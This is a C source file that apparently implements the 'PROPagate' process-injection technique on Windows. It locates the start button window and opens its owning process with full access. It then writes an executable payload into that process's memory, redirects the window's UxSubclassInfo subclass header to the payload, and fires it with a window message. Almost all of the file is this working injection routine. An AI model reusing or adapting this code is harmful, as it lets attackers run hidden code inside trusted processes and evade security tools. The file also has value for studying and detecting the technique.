/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  

#include "propagate.h"

// display error message for last error code
VOID xstrerror (PWCHAR fmt, ...){
    PWCHAR  error=NULL;
    va_list arglist;
    WCHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPWSTR)&error, 0, NULL))
    {
      wprintf(L"  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
    }
}

int main(void){
    HANDLE          hProcess;
    DWORD           dwPid,dwTid;
    LPVOID          addr;
    HWND            hWnd, hProp;
    SUBCLASS_HEADER sh;
    LPVOID          psh, pfnSubclass;
    LPVOID          payload=NULL;
    DWORD           payloadSize=0;
    DWORD           read,written,evt;
    BOOL            bRead, bResult;
    HANDLE          hEvent;
    
    // 1. Get the window handle for start button
    hWnd=FindWindowEx(GetDesktopWindow(), NULL, L"Button", NULL);
    if(!hWnd){
      wprintf(L"[-] Unable to find start button\n");
      return 0;
    }
    // 2. See if we can obtain the remote address of subclass header
    hProp=GetProp(hWnd, L"UxSubclassInfo");
    if(hProp==0){
      wprintf(L"[-] Unable to obtain remote address of subclass header\n");
      return 0;
    }
    wprintf(L"[+] Subclass Header address : %p\n", hProp);
    // 3. Get the process id for window
    GetWindowThreadProcessId(hWnd, &dwPid);
    // 4. Try to open the process
    hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPid);
    if(hProcess==NULL){
      wprintf(L"[-] Unable to open process %i\n", dwPid);
      return 0;
    }
    // 5. Try to read a subclass header from remote process
    bRead=ReadProcessMemory(hProcess, (LPVOID)hProp, &sh, sizeof(sh), &read);
    if(bRead){
      // 6. Allocate memory for subclass header
      psh=VirtualAllocEx(hProcess, NULL, sizeof(sh), 
          MEM_COMMIT, PAGE_READWRITE);
      if(psh!=NULL){
        wprintf(L"[+] New remote subclass header is %p\n", psh);
        // 7. Allocate memory for subclass procedure / payload
        pfnSubclass=VirtualAllocEx(hProcess, NULL, PAYLOAD_SIZE, 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
        if(pfnSubclass!=NULL){
          wprintf(L"[+] New remote subclass procedure is %p\n", pfnSubclass);
          // 8. Write our payload to memory including pointer to old subclass header
          WriteProcessMemory(hProcess, pfnSubclass, PAYLOAD, PAYLOAD_SIZE, &written);
          // 9. Set pfnSubclass to payload address, and write 
          //    back to process in new area of memory
          sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
          WriteProcessMemory(hProcess, psh, &sh, sizeof(sh), &written);
          // 10. Create a named event to wait for signal on.
          hEvent=CreateEvent(NULL,FALSE,FALSE,L"propagate");
          if(hEvent!=NULL){
            // 11. Update with SetProp
            wprintf(L"[+] Calling SetProp.\n");
            bResult=SetProp(hWnd, L"UxSubclassInfo", psh);
            if(bResult){
              // 12. Trigger payload via windows message
              wprintf(L"[+] Triggering payload.\n");
              PostMessage(hWnd, WM_CLOSE, 0, 0);
              
              // 13. Restore original subclass header
              SetProp(hWnd, L"UxSubclassInfo", hProp);
              
              wprintf(L"[+] Waiting for signal.\n");
              evt=WaitForSingleObject(hEvent,5*1000);
              
              wprintf(L"[+] Restoring subclass header.\n");

              
              wprintf(L"[+] Code injection %s.\n", 
                evt==0?L"successful":L"failed");
                
            } else xstrerror(L"SetProp");
            CloseHandle(hEvent);
          } else xstrerror(L"CreateEvent");
          // free payload memory if required
           VirtualFree(pfnSubclass,PAYLOAD_SIZE,MEM_RELEASE);
        } else xstrerror(L"VirtualAlloc(payloadSize)");
        // free subclass header if required
         VirtualFree(psh,sizeof(sh),MEM_RELEASE);
      } else xstrerror(L"VirtualAlloc(SUBCLASS_HEADER)");
    } else xstrerror(L"ReadProcessMemory(SUBCLASS_HEADER)");
    CloseHandle(hProcess);
    return 0;
}
